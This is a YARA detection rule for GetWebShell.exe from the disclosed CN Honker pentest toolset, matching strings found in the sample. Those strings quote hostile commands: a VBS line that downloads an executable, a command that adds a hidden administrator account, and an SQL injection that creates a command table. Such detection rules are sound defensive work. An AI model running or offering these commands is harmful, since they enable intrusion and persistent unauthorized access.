rule CN_Honker_GetWebShell {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file GetWebShell.exe"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "b63b53259260a7a316932c0a4b643862f65ee9f8"
	strings:
		$s0 = "echo P.Open \"GET\",\"http://www.baidu.com/ma.exe\",0 >>run.vbs" fullword ascii /* PEStudio Blacklist: strings */
		$s5 = "http://127.0.0.1/sql.asp?id=1" fullword wide /* PEStudio Blacklist: strings */
		$s14 = "net user admin$ hack /add" fullword wide /* PEStudio Blacklist: strings */
		$s15 = ";Drop table [hack];create table [dbo].[hack] ([cmd] [image])--" fullword wide /* PEStudio Blacklist: strings */
	condition:
		uint16(0) == 0x5a4d and filesize < 70KB and 1 of them
}